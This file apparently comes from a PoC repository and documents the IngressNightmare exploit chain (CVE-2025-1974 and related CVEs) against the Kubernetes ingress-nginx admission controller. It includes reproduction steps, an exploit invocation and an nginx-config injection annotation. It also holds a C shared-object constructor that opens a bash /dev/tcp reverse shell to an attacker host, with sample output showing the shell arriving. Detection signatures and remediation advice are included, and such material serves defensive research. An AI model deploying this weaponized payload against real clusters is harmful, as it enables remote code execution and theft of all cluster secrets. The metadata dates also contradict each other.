# IngressNightmare - Kubernetes Ingress-NGINX Unauthenticated RCE

<!-- 
  File: 2026-05-17_ingressnightmare-k8s-ingress-nginx-rce.md
  Location: pocs/cloud/
-->

---

## Metadata

| Field | Value |
|---|---|
| **Date Added** | 2026-05-17 |
| **Last Updated** | 2025-03-26 |
| **Author / Researcher** | Hakai Security (hakaioffsec) / QuimeraX Intelligence; original vulnerability discovery by Wiz Research |
| **CVE / Advisory** | CVE-2025-1974 (primary); also CVE-2025-1097, CVE-2025-1098, CVE-2025-24514 |
| **Category** | cloud |
| **Severity** | Critical |
| **CVSS Score** | 9.8 (CVSSv3) |
| **Status** | Weaponized |
| **Tags** | RCE, Kubernetes, ingress-nginx, admission-controller, unauthenticated, nginx-config-injection, cluster-takeover, k8s, shared-object, reverse-shell |
| **Related** | N/A |

---

## Affected Target

| Field | Value |
|---|---|
| **Software / System** | Kubernetes Ingress-NGINX Controller (ingress-nginx) |
| **Versions Affected** | Ingress-NGINX Controller prior to 1.12.1 and prior to 1.11.5 |
| **Language / Platform** | Python 3.x (exploit), C (shared object payload); Kubernetes cluster environment |
| **Authentication Required** | No (unauthenticated, reachable from within pod network) |
| **Network Access Required** | Yes (access to ingress controller pod network or admission webhook endpoint) |

---

## Summary

IngressNightmare is a chain of critical vulnerabilities (CVE-2025-1097, CVE-2025-1098, CVE-2025-24514, CVE-2025-1974) in the Kubernetes Ingress-NGINX admission controller. Discovered by Wiz Research, the vulnerabilities allow an unauthenticated attacker reachable from within the Kubernetes pod network to achieve Remote Code Execution on the ingress-nginx controller pod and subsequently read all secrets across all namespaces, enabling full cluster takeover. This PoC was developed by Hakai Security / QuimeraX Intelligence after Wiz did not release a functional exploit. It exploits unsafe nginx configuration injection via the admission webhook, uploading a malicious shared object as the ssl_engine directive to obtain a reverse shell.

---

## Vulnerability Details

### Root Cause

The Ingress-NGINX admission webhook processes Ingress resource annotations without sufficient sanitization of user-supplied values. Specifically, annotations such as `nginx.ingress.kubernetes.io/auth-tls-match-cn` are injected directly into the generated nginx.conf file without proper escaping or validation (CWE-74: Improper Neutralization of Special Elements in Output). This allows an attacker to inject arbitrary nginx configuration directives, including `ssl_engine`, which instructs nginx to load a custom shared object from a path resolvable within the pod's filesystem. Since the admission webhook is accessible from within the pod network without authentication, any pod in the cluster can trigger the exploit.

### Attack Vector

1. The attacker compiles a malicious C shared object (`evil_engine.so`) containing a constructor that executes a reverse shell command.
2. The shared object is uploaded to the ingress-nginx controller pod via a crafted HTTP POST with a mismatched `Content-Length` header, keeping the connection and file descriptor open so the file persists at a predictable `/proc/{pid}/fd/{fd}` path.
3. The attacker sends a crafted AdmissionReview request to the admission webhook endpoint, injecting an `ssl_engine` directive pointing to the file descriptor path (`/proc/{pid}/fd/{fd}`).
4. The admission controller processes the forged nginx config, nginx loads the `ssl_engine` shared object, and the constructor payload executes the reverse shell.
5. File descriptor is brute-forced by iterating over process IDs (1-50) and file descriptor numbers (3-30).

### Impact

Remote Code Execution as the ingress-nginx controller process within the Kubernetes cluster. The controller pod has a service account token with privileges to read all Kubernetes secrets across all namespaces. This enables extraction of credentials, certificates, and API keys for all applications in the cluster, and full cluster takeover by impersonating privileged service accounts.

---

## Environment / Lab Setup

```
OS:          Linux (attacker and Kubernetes nodes)
Target:      Kubernetes cluster with Ingress-NGINX Controller < 1.12.1 / < 1.11.5
Attacker:    Pod within the cluster or host with access to the pod network
Tools:       Python 3.x, GCC compiler, pip (requests module), netcat (reverse shell listener)
Network:     Access to ingress controller pod IP (public ingress URL) and admission webhook URL (internal)
```

### Setup Steps

```bash
# Install Python dependencies
pip3 install -r requirements.txt

# Compile the reverse shell shared object (handled automatically by exploit.py)
# lib_template.c is compiled with attacker HOST:PORT substituted
gcc -fPIC -Wall -shared -o evil_engine.so evil_engine.c -lcrypto

# Start a reverse shell listener on attacker machine
nc -lvnp 443
```

---

## Proof of Concept

### Step-by-Step Reproduction

1. **Set up reverse shell listener** on your attacker host.
   ```bash
   nc -lvnp 443
   ```

2. **Run the exploit** providing the public ingress URL, internal admission webhook URL, and attacker host:port.
   ```bash
   python3 exploit.py http://<INGRESS_URL> https://rke2-ingress-nginx-controller-admission.kube-system <ATTACKER_IP>:443
   ```
   Note: if the admission webhook is in a different namespace, append the namespace as a 4th argument.

3. **Exploit workflow executed automatically:**
   - `exploit.py` compiles `evil_engine.so` from `lib_template.c` with attacker IP/port substituted.
   - Sends the `.so` to the ingress pod via HTTP with mismatched Content-Length to keep the fd open.
   - Brute-forces `/proc/{pid}/fd/{fd}` against the admission webhook via threaded `AdmissionReview` requests.
   - Nginx loads the `ssl_engine` pointing to the fd path, the constructor fires the reverse shell.

4. **Receive reverse shell** in the netcat listener.

### Exploit Code

> See `exploit.py` and `lib_template.c` in this folder.

```python
# exploit.py - abbreviated workflow
# 1. Compile evil_engine.so with reverse shell payload
create_lib(host, port)  # substitutes HOST/PORT in lib_template.c, compiles with gcc

# 2. Upload .so to ingress pod, keep fd open via mismatched Content-Length
x = threading.Thread(target=exploit, args=(ingress_url,))
x.start()

# 3. Brute-force /proc/{pid}/fd/{fd} via admission webhook
admission_brute(admission_url)
```

```c
/* lib_template.c - reverse shell payload (loaded via ssl_engine) */
#include <stdlib.h>
__attribute__((constructor))
void run_on_load() {
    system("bash -c 'bash -i >& /dev/tcp/HOST/PORT 0>&1'");
}
```

### Expected Output

```
[+] Shared object compiled successfully
[*] Sending evil_engine.so to ingress pod...
Trying Proc: 1, FD: 3
Trying Proc: 1, FD: 4
...
Response for /proc/7/fd/15: 200
[reverse shell received on attacker netcat listener]
```

---

## Screenshots / Evidence

<!-- Add paths to screenshots or embed them -->
- No screenshots provided in source repository. A demo video is available in the repo: `assets/9e893abf-5c01-4fcb-ad79-7115b429281f`.

---

## Detection & Indicators of Compromise

```
# Kubernetes audit log: unusual AdmissionReview requests with nginx annotation injection
# Look for annotations containing: ssl_engine, /proc/, or unusual nginx directives

# Ingress-nginx controller pod: unexpected outbound TCP connections (reverse shell)
# Unexpected child processes under nginx worker processes

# Kubernetes secrets: audit log showing bulk secret reads across namespaces from ingress-nginx SA

# nginx.conf injection signature:
"nginx.ingress.kubernetes.io/auth-tls-match-cn": "CN=abc #(\\n){}\\n }}\\nssl_engine ../../../../../../proc/{pid}/fd/{fd};"
```

**SIEM / IDS Rule (example):**
```
alert http any any -> $K8S_ADMISSION_WEBHOOK any (msg:"CVE-2025-1974 IngressNightmare ssl_engine Injection"; content:"ssl_engine"; content:"/proc/"; within:50; http_client_body; sid:9002027; rev:1;)
```

---

## Remediation

| Action | Detail |
|---|---|
| **Patch** | Upgrade Ingress-NGINX Controller to 1.12.1 or 1.11.5 immediately |
| **Workaround** | Restrict admission webhook access to only the Kubernetes API Server using NetworkPolicy; temporarily disable the admission controller component if patching is not immediately possible |
| **Config Hardening** | Apply network policies preventing direct pod-to-webhook communication; audit all Ingress annotations for unexpected nginx directives; enable Kubernetes audit logging for AdmissionReview requests |

---

## References

- [CVE-2025-1974](https://nvd.nist.gov/vuln/detail/CVE-2025-1974)
- [CVE-2025-1097](https://nvd.nist.gov/vuln/detail/CVE-2025-1097)
- [CVE-2025-1098](https://nvd.nist.gov/vuln/detail/CVE-2025-1098)
- [CVE-2025-24514](https://nvd.nist.gov/vuln/detail/CVE-2025-24514)
- [Wiz Research - IngressNightmare Blog Post](https://www.wiz.io/blog/ingress-nginx-kubernetes-vulnerabilities)
- [Hakai Security](https://hakaisecurity.io/)
- [Source Repository](https://github.com/hakaioffsec/IngressNightmare-PoC)

---

## Notes

The Wiz Research team discovered the vulnerability chain but did not publish a functional exploit; Hakai Security / QuimeraX built and released this independent PoC. The file descriptor persistence trick (sending a larger `Content-Length` than actual body to keep the connection and fd alive) is the key enabler for the attack. Review the `review.json` file's annotation field to understand the exact injection format. The brute-force range for proc/fd can be extended but may generate significant noise. Auto-ingested from https://github.com/hakaioffsec/IngressNightmare-PoC on 2026-05-17.
